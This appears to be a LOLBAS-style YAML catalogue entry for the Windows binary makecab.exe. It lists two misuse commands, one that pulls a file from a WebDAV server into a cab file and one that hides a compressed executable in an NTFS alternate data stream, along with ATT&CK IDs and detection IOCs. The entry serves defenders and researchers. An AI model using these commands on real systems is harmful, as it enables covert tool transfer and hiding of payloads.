---
name: Makecab.exe
description: Binary to package existing files into a cabinet (.cab) file
functions:
  download:
    - description: Download and compresses the target file and stores it in the target file.
      code: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file and compress into a cab file
  ads:
    - description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
      code: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Hide data compressed into an alternate data stream
resources:
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
fullpath:
    - path: C:\Windows\System32\makecab.exe
    - path: C:\Windows\SysWOW64\makecab.exe
detection:
  - IOC: Makecab getting files from Internet
  - IOC: Makecab storing data into alternate data streams
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
